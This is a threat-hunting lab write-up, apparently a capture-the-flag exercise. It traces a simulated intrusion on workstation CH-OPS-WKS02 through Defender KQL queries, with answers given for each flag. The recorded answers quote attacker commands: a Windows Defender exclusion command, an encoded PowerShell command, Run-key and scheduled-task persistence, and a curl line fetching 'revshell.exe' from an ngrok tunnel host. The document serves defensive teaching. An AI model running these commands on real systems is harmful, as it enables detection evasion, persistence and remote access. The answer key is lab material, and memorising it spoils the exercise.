


# CorpHealth — Operations Activity Review (WIP)

## Background

Your organization recently completed a phased deployment of an internal 
platform known as **CorpHealth** — a lightweight system monitoring and 
maintenance framework designed to:

- Track endpoint stability and performance
- Run automated post-patch health checks
- Collect system diagnostics during maintenance windows
- Reduce manual workload for operations teams

CorpHealth operates using a mix of scheduled tasks, background services, 
and diagnostic scripts deployed across operational workstations.

To support this, IT provisioned a dedicated operational account. This 
account was granted local administrator privileges on specific systems 
in order to:

- Register scheduled maintenance tasks
- Install and remove system services
- Write diagnostic and configuration data to protected system locations
- Perform controlled cleanup and telemetry operations

It was designed to be used **only through approved automation frameworks**, 
not through interactive sign-ins.

---

## Anomalous Activity

In mid-November, routine monitoring began surfacing unusual activity tied 
to a workstation in the operations environment. At first glance, the 
activity appeared consistent with normal system maintenance tasks: health 
checks, scheduled runs, configuration updates, and inventory synchronization.

However, closer review raised concerns:

- Activity occurred outside normal maintenance windows
- Script execution patterns deviated from approved baselines
- Diagnostic processes were launched manually rather than through automation
- Some actions resembled behaviors often associated with credential 
  compromise or script misuse

Much of this activity was associated with an account that normally runs 
silently in the background.

---

CorpHealth: Traceback 
Flag 0: Identify the device*
Your first step is confirming which workstation generated the unusual telemetry.
Initial log clustering shows that all suspicious events originated from a single endpoint active during an off-hours window in the middle of November.  
During your initial sweep, look for a workstation that shows:
A small cluster of events during an unusual maintenance window 
Activity between Mid November to Early December.
Multiple entries with sources tied to Process Events, Network Events,File Events and Script-based operations
Hint: typical naming conventions for devices include abbreviating the company name as a prefix.
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-12-18T20:00:00))
| where hourofday(TimeGenerated) < 6 or hourofday(TimeGenerated) >= 18
| where InitiatingProcessCommandLine has_any ("cmd.exe", "powershell.exe")
| summarize EventCount = count() by DeviceName
| sort by EventCount desc
For example "Wells Fargo : wf-xxx-xxx01"  ch-ops-wks02






CorpHealth: Traceback 
Flag 0: Identify the device*
Your first step is confirming which workstation generated the unusual telemetry.
Initial log clustering shows that all suspicious events originated from a single endpoint active during an off-hours window in the middle of November.  
During your initial sweep, look for a workstation that shows:
A small cluster of events during an unusual maintenance window 
Activity between Mid November to Early December.
Multiple entries with sources tied to Process Events, Network Events,File Events and Script-based operations
Hint: typical naming conventions for devices include abbreviating the company name as a prefix.
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-12-18T20:00:00))
| where hourofday(TimeGenerated) < 6 or hourofday(TimeGenerated) >= 18
| where InitiatingProcessCommandLine has_any ("cmd.exe", "powershell.exe")
| summarize EventCount = count() by DeviceName
| sort by EventCount desc
For example "Wells Fargo : wf-xxx-xxx01"  ch-ops-wks02






Flag 1: Unique Maintenance File*
You’ve confirmed that  ch-ops-wks02   is the workstation of interest and narrowed your timeframe to the mid-November maintenance window.
Before you dig into outbound activity, you decide to sanity-check what’s actually running on this box during “routine” operations.
CorpHealth uses a mix of scheduled scripts and diagnostic utilities across multiple endpoints. Most of them are standard, repeated across many machines. But one script on CH-OPS-WKS02 appears to be unique to this host, tied to recent maintenance work.
As an analyst, you want to know which “maintenance” file stands out here before treating any behavior as normal.
Hint
Focus on script-like files in locations or similar paths.
Think like an analyst doing “what’s normal vs. what’s unique on this box?”.
Compare filenames across devices and look for a script that only shows up on CH-OPS-WKS02.
2025-11-23T03:46:05.1586428Z
powershell.exe  -ExecutionPolicy Bypass -File C:\ProgramData\Corp\Ops\MaintenanceRunner_Distributed.ps1

Flag 2: Outbound beacon indicator*
After identifying the unique maintenance script, you now pivot into other queries to determine what this script actually did when executed.
CorpHealth agents often phone home to internal listeners or update servers — but the behavior from CH-OPS-WKS02 feels different. 
Determine when the maintenance script first initiated outbound communication. (e.g. Timestamp)
Hint
Use DeviceNetworkEvents.
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-11-28T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where InitiatingProcessCommandLine contains "MaintenanceRunner"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl
| sort by TimeGenerated asc

Filter for the exact device name and look for network activity generated by the suspicious script
The script’s command line should appear inside InitiatingProcessCommandLine.  
Time Executed: 2025-11-23T03:46:08.400686Z


Flag 3: Identify the Beacon Destination  *
You’ve confirmed the suspicious PowerShell activity on CH-OPS-WKS02, and the process responsible appears to be tied to a maintenance-related script.
Now that you’ve validated the local script footprint, leadership wants to know something more urgent:
Where was the workstation trying to beacon to?
Even if the connection failed, the attempt itself can reveal intent — exfiltration staging, command-and-control signaling, or internal lateral movement.
Your task is to examine the network telemetry associated with the script execution and extract the actual network destination the host attempted to reach.
This beacon traffic is your first concrete IOC leading off-host.
What Remote IP and port did CH-OPS-WKS02 attempt to connect to during the beacon event?
(Format your answer as: IP:Port )
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-11-28T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where InitiatingProcessCommandLine contains "MaintenanceRunner"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl
| sort by TimeGenerated asc
Hint
Filter DeviceNetworkEvents on CH-OPS-WKS02 and look for events where
InitiatingProcessCommandLine contains the maintenance script
2025-11-23T03:46:08.400686Z 127.0.0.1:8080


Flag 4:  Confirm the Successful Beacon Timestamp*
Your investigation now has a clearer shape:
The host ran a suspicious maintenance script.
That script attempted to beacon out.
You’ve identified the destination IP and port.
But now you need to know something more specific and operationally important:
👉 When did the beacon finally succeed?
Even if some earlier attempts failed, a successful outbound connection indicates the earliest point the actor could have received instructions or data back from the host.
This timestamp often becomes the pivot point for reconstructing the attack timeline.
Your task:
Review network telemetry again and isolate the latest (max()) ConnectionSuccess event originating from the maintenance script, including the remote IP and port.
This will anchor your timeline for subsequent flags.
 What is the most recent (latest) timestamp where CH-OPS-WKS02 successfully connected (ConnectionSuccess) to the beacon IP and port?  
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-11-30T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where RemoteIP == "127.0.0.1"
| where RemotePort == "8080"
| where ActionType contains "ConnectionSuccess"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl
| sort by TimeGenerated asc
Hint
Filter DeviceNetworkEvents for ActionType == "ConnectionSuccess"
Keep only events where
InitiatingProcessCommandLine contains the maintenance script
Match the same RemoteIP and RemotePort from the previous flag
Sort by timestamp descending and take the newest entry
2025-11-30T01:03:17.6985973Z 

Flag 5 — Unexpected Staging Activity Detected*
Your investigation has moved beyond network telemetry.
Something about the connection pattern you traced in the previous flag suggests the attacker wasn’t just “checking in” — they were preparing the host for something larger.
On compromised endpoints, attackers frequently stage data they want to collect, tamper with, or exfiltrate.
These staging operations often appear as new files created in unusual directories, or copies of existing system information placed in “working” folders.
Your task now:
➡️ Determine exactly what artifacts the attacker staged.
This will help you understand what they intended to take — or alter.
What is the full file path of the First primary staging artifact created during the attack?
(Write the complete absolute path as it appears in your logs.)
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-14T00:00:00) .. datetime(2025-12-1T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where FolderPath contains @"\Diagnostics"
| where ActionType == "FileCreated" 
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessAccountName, FolderPath
| sort by TimeGenerated desc
Hint
Look for created files under any of the “CorpHealth” operational folders.
Focus especially on Diagnostics directories — attackers commonly use them for staging.
2025-11-25T04:15:02.4575635Z  powershell.exe  -ExecutionPolicy Bypass -File C:\ProgramData\Corp\Ops\MaintenanceRunner_Distributed.ps1  C:\ProgramData\Microsoft\Diagnostics\CorpHealth\inventory_6ECFD4DF.csv 
File Name: inventory_6ECFD4DF.csv

FLAG 6 — Confirm the Staged File’s Integrity  *
Now that you’ve identified the attacker’s staging location, you’ve recovered the suspicious file placed in the system’s diagnostic directory.
But finding the file is just the beginning.
Analysts rarely trust a recovered artifact at face value — especially one dropped during a suspected intrusion.
Your next step is to verify the file’s cryptographic fingerprint.
In real incident response:
Hashes help confirm whether files match known malware
They allow comparison against threat intelligence feeds
They ensure chain-of-custody integrity during analysis
Your task mirrors that process.
What is the SHA-256 hash of the staged file you identified in the previous flag? (Provide the full 64-character hexadecimal SHA256 value.)
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-14T00:00:00) .. datetime(2025-12-1T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where FolderPath contains @"\Diagnostics"
| where ActionType == "FileCreated" 
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessAccountName, FolderPath, SHA256
| sort by TimeGenerated desc
Hint
Use DeviceFileEvents to retrieve hash metadata for the file.  7f6393568e414fc564dad6f49a06a161618b50873404503f82c4447d239f12d8
2025-11-25T04:15:02.4575635Z inventory_6ECFD4DF.csv


Flag 7 — Identify the Duplicate Staged Artifact*
You’ve confirmed the SHA-256 hash of the attacker’s primary staging file.
Good. But something feels off.
Threat actors often stage redundant or decoy files for several reasons:
To confuse responders
To test which folders are monitored
To discard intermediary versions
To probe what security tools detect or ignore
To preserve backups of their in-progress work
When you zoom out and look across all file events on CH-OPS-WKS02, you notice patterns in the filenames, sizes, and write times.
One particular detail stands out:
It looks like another file exists that is:
Very similar in name
Roughly the same size
Written around the same timeframe
BUT has a different SHA-256 hash
AND is located in a different directory
This is almost certainly an attacker “working copy” or alternate staging location.
Your job is to find it.
What is the full file path of the second file.
➡️ Provide the complete absolute path as it appears in your logs.
Hint
Search for other files containing the word inventory created around the same timeframe
C:\Users\ops.maintenance\AppData\Local\Temp\CorpHealth\inventory_tmp_6ECFD4DF.csv
2025-11-25T04:15:02.4914978Z
Flag 8 — Suspicious Registry Activity  *
Your earlier findings revealed clear signs of the attacker preparing data for exfiltration. The presence of staging files in multiple directories strongly suggests they were testing what could be accessed—and what could be extracted.
Now the timeline shows something far more concerning.
Analysts reviewing the event timeline notice that a suspicious PowerShell script attempted to inspect or tamper with system configuration. One registry key stands out as anomalous and directly tied to the attacker’s “Credential Harvesting Simulation” stage.
❓ Which exact registry key was created or touched during this activity?
➡️ Provide the full registry path as shown in logs ( HKEY_LOCAL_MACHINE\ …)
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-20T00:00:00) .. datetime(2025-12-1T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where ActionType == "RegistryKeyCreated"
| where InitiatingProcessAccountName != "network service"
| where InitiatingProcessAccountName != "system"
| where InitiatingProcessFileName != "onedrivesetup.exe"
| project TimeGenerated, InitiatingProcessAccountName, InitiatingProcessCommandLine, RegistryKey
powershell.exe  -ExecutionPolicy Bypass -File C:\ProgramData\Corp\Ops\MaintenanceRunner_Distributed.ps1
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\EventLog\Application\CorpHealthAgent
2025-11-25T04:14:40.9857945Z


Flag 9 — Scheduled Task Persistence*
You continue examining the activity coming from CH-OPS-WKS02.
Moments after the credential-related registry anomaly, you notice additional persistence patterns.
Even though some attempts may have failed due to permission issues, at least one scheduled task was successfully created earlier in the investigation window.
This task is not part of CorpHealth’s standard approved tasks and represents an unauthorized persistence mechanism.
❓ Which Scheduled Task Did the Attacker First Create?
Provide the full Scheduled Task name created during the attack. (e.g. HKEY_LOCAL_MACHINE\...\...\...\...\Schedule\TaskCache\Tree\GoogleUserPEH)
Hint
Search DeviceRegistryEvents where:
ActionType == "RegistryKeyCreated" or "RegistryValueSet"
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-12-15T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where ActionType == "RegistryValueSet"
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessCommandLine
| sort by TimeGenerated asc
TaskCache\Tree\This is exactly where Windows stores scheduled task entries in the registry 
2025-11-25T04:15:26.9010509Z
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\CorpHealth_A65E64
Flag 10 - Registry-based Persistence  *
  As your investigation advances, you pivot toward examining whether the attacker attempted any form of persistence.
Your earlier findings suggested the script may have tampered with startup mechanisms — but now you have confirmation.  
You observe:
A new Run key value created
A value written pointing to an execution of a PowerShell script
And the value deleted shortly after
This pattern is intentional—it resembles ephemeral persistence, meant to survive a single reboot or login, trigger once, and then erase its tracks.
Your goal: identify which value name was created.
What Registry Value Name Was Added to the Run Key?
Provide the exact RegistryValueName associated with the persistence attempt.
Hint
Filter DeviceRegistryEvents for:
RegistryKeyCreated
RegistryValueSet
RegistryKeyDeleted
2025-11-25T04:24:48.8957038Z
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
MaintenanceRunner
FLAG 11 — Privilege Escalation Event Timestamp*
During the intrusion, the attacker executed a simulated privilege-escalation action inside the MaintenanceRunner sequence.
Your task:
➡️ Locate the exact Timestamp (UTC) of the FIRST ConfigAdjust privilege-escalation event.
This event comes from the Application log and carries an event payload (AdditionalFields) describing a configuration adjustment.
Hint
Provide the timestamp exactly as the logs display it in its DeviceEvents logs.
This is not a process creation, registry modification, or network event — only an Application event.  
DeviceEvents
| where TimeGenerated between (datetime(2025-11-15T00:00:00) .. datetime(2025-11-26T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where AdditionalFields contains "ConfigAdjust"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, AdditionalFields, InitiatingProcessAccountName
| sort by TimeGenerated asc
powershell.exe  -ExecutionPolicy Bypass -File C:\ProgramData\Corp\Ops\MaintenanceRunner_Distributed.ps1
2025-11-23T03:47:21.8529749Z
FLAG 12 — Identify the AV Exclusion Attempt  *
Your investigation reveals that the attacker attempted to modify Windows Defender settings to exclude a specific folder from real-time scanning.  
What folder path did the attacker attempt to add as an exclusion in Windows Defender?
Provide the full folder path as shown in telemetry.
This flag focuses on identifying the exact ExclusionPath the attacker attempted to protect from detection. (e.g. C:\...\...\...\...)
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-26T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where FileName has_any ("powershell.exe", "cmd.exe") 
| where ProcessCommandLine  has_any ("Add-MpPreference",
"Set-MpPreference")
| project TimeGenerated,  ProcessCommandLine
2025-11-23T03:46:37.92301Z
"cmd.exe" /c echo powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath C:\ProgramData\Corp\Ops\staging -Force > ".cli" 
FLAG 13 — PowerShell Encoded Command Execution  *
During the intrusion, a PowerShell process executed using the -EncodedCommand flag.
By analyzing DeviceProcessEvents, determine:
➡️ What decoded PowerShell command was executed First?
(Provide the decoded plaintext command.)
Hints  
Filter for EncodedCommand : 
DeviceProcessEvents | where ProcessCommandLine contains "-EncodedCommand"
Filter for the AccountName in question, make sure to avoid system processes
Extract and decode the Base64 string:
PowerShell Unicode Base64 decoding (local analyst method):[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("<encoded>"))
KQL Unicode Base64 decoding (add this to your KQL): 
| extend Enc = extract(@"-EncodedCommand\s+([A-Za-z0-9+/=]+)", 1, ProcessCommandLine)
| extend Decoded = base64_decode_tostring(Enc)
You can copy the decoded value from the logs to your clipboard and it will paste without the null values.
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-11-28T20:00:00))
| where hourofday(TimeGenerated) < 6 or hourofday(TimeGenerated) >= 18
| where DeviceName contains "CH-OPS-WKS02"
| where InitiatingProcessCommandLine contains "powershell.exe"
| where AccountName != "system" 
| where AccountName != "local service" 
| sort by TimeGenerated asc 
| project TimeGenerated, AccountName, FolderPath, InitiatingProcessCommandLine
2025-11-23T03:46:25.5255093Z
"powershell.exe" -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAbwBrAGUAbgAtADYARAA1AEUANABFAEUAMAA4ADIAMgA3ACcA 
Decodes to : Write-Output 'token-6D5E4EE08227'
Flag 14 — Privilege Token Modification  *
You’ve traced the suspicious registry activity and the scheduled persistence artifacts back to the same PowerShell execution chain.
But the attacker didn’t stop there.
As you review deeper system events, something stands out:
Windows recorded a ProcessPrimaryTokenModified event, a behavior consistent with attackers attempting to escalate privileges or adjust token integrity to blend in with SYSTEM-level processes.
Your task now is to pinpoint which process actually performed that token modification.
What is the "InitiatingProcessId" of the process whose token privileges were modified?
Hint
Filter DeviceEvents where AdditionalFields contains either:
"tokenChangeDescription"
"Privileges were added"
Recall the Flag 1 Script.
Flag 14 — Privilege Token Modification  *
You’ve traced the suspicious registry activity and the scheduled persistence artifacts back to the same PowerShell execution chain.
But the attacker didn’t stop there.
As you review deeper system events, something stands out:
Windows recorded a ProcessPrimaryTokenModified event, a behavior consistent with attackers attempting to escalate privileges or adjust token integrity to blend in with SYSTEM-level processes.
Your task now is to pinpoint which process actually performed that token modification.
What is the "InitiatingProcessId" of the process whose token privileges were modified?
Hint
Filter DeviceEvents where AdditionalFields contains either:
"tokenChangeDescription"
"Privileges were added"
Recall the Flag 1 Script.
DeviceEvents
| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-26T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where AdditionalFields has_any ("tokenChangeDescription", "Privileges were added")
| where InitiatingProcessCommandLine contains "MaintenanceRunner_Distributed.ps1"
| sort by TimeGenerated asc 
{"TokenModificationProperties":"{\"tokenChangeDescription\":\"Privileges were added to the process token of an unknown process\",\"privilegesFlags\":[],\"isChangedToSystemToken\":false,\"originalTokenIntegrityLevelName\":\"High\",\"currentTokenIntegrityLevelName\":\"High\"}","SystemTokenPointer":"18446640769524940864","OriginalTokenIntegrityLevel":"12288","OriginalTokenPointer":"18446640769657225312","OriginalTokenPrivEnabled":"1619001344","OriginalTokenPrivPresent":"130793013024","OriginalTokenSource":"VXNlcjMyIAA=","OriginalTokenUserSid":"S-1-5-21-1605642021-30596605-784192815-1000","CurrentTokenIntegrityLevel":"12288","CurrentTokenPointer":"18446640769657225312","CurrentTokenPrivEnabled":"1620049920","CurrentTokenSource":"VXNlcjMyIAA=","CurrentTokenUserSid":"S-1-5-21-1605642021-30596605-784192815-1000"}
InitiatingProcessId: 4888
2025-11-25T04:14:07.0587586Z


Flag 15 -  Whose Token Was Modified?  *
You’ve confirmed that a process on CH-OPS-WKS02 modified its own token privileges — a classic PrivEsc behavior.
But you still don’t know whose token was affected.
Digging into the raw event details, you notice that the token modification record doesn’t just describe what changed; it also tells you which security principal (SID) the token belongs to. That’s crucial context:
Was this a low-priv user?
A domain user?
Or a built-in local admin?
If an attacker is adjusting privileges on the local Administrator token, that significantly raises the risk profile of any follow-on activity.
Time to pull that identity out of AdditionalFields.
Which security identifier (SID) did the modified token belong to?
Using Defender Advanced Hunting, find the same token modification event you used in the previous flag (Flag 14).
This time, inspect the AdditionalFields JSON and identify the user SID associated with the modified token.
Specifically, you’re looking for the field:
OriginalTokenUserSid (which matches CurrentTokenUserSid in this case)
DeviceEvents
| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-26T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where AdditionalFields has_any ("tokenChangeDescription", "Privileges were added")
| where InitiatingProcessCommandLine contains "MaintenanceRunner_Distributed.ps1"
| sort by TimeGenerated asc 


"S-1-5-21-1605642021-30596605-784192815-1000"




Flag 16 –  Ingress Tool Transfer from External Dynamic Tunnel  *
After the privilege escalation, Defender recorded a new executable being written to disk on CH-OPS-WKS02. The timing and location of this file suggest it was delivered as staging material for follow-on activity. Your job is to identify the exact filename the attacker introduced.
What is the name of the executable that was written to disk after the outbound request?
Hints:
DeviceFileEvents
| where TimeGenerated between (datetime(2025-12-02T00:00:00) .. datetime(2025-12-03T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where ActionType == "FileCreated" 
| where FileName endswith ".exe"
| project TimeGenerated, ActionType, FileName, InitiatingProcessCommandLine, InitiatingProcessAccountName, FolderPath
Curl event occurred 2025-12-02T12:56:54.274253Z
"curl.exe" -o revshell.exe https://unresuscitating-donnette-smothery.ngrok-free.dev/revshell.exe
Executable created: revshell.exe
Flag 17 — Identify the External Download Source  *
Before the suspicious file appeared on the workstation, the host reached out to an external dynamic-tunnel domain using curl.exe. This outbound request fetched the executable later used in post-escalation activity. Identify the exact remote URL involved in this transfer.
What URL did the workstation connect to when retrieving the file?
Unresuscitating-donnette-smothery.ngrok-free.dev
3.22.30.40:443
"curl.exe" -o revshell.exe https://unresuscitating-donnette-smothery.ngrok-free.dev/revshell.exe











































